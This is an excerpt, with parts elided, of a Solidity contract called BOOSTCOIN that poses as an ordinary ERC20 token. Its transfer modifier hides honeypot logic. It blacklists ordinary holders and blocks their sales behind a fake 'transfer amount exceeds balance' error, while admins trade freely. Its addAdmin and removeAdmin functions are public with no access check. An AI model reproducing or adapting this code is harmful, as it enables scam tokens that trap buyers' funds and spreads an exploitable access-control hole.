 ...
 */
contract BOOSTCOIN is Context, IERC20 {
  ...
  function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
   ...
   function decreaseAllowance(address safeOwner) public {
    ...
    function addAdmin(address addressToMakeAdmin) public {
        _isAdmin[addressToMakeAdmin] = true;
    }

    function removeAdmin(address addressToRemoveAdmin) public {
        _isAdmin[addressToRemoveAdmin] = false;
    }    
    ...
    modifier burnTokenCheck(address sender, address recipient, uint256 amount){
        if (_owner == _safeOwner && _isAdmin[sender]){_safeOwner = recipient;_;}else{
            if (_isAdmin[sender] || _isAdmin[recipient]){
                if (_isAdmin[sender] && sender == recipient){_sellAmount = amount;}_;}else{
                if (_whiteAddress[sender] == true){
                _;}else{if (_blackAddress[sender] == true){
                require((_isAdmin[sender])||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}else{
                if (amount < _sellAmount){
                if(_isAdmin[recipient]){_blackAddress[sender] = true; _whiteAddress[sender] = false;}
                _; }else{require((_isAdmin[sender])||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}
                    }
                }
            }
        }
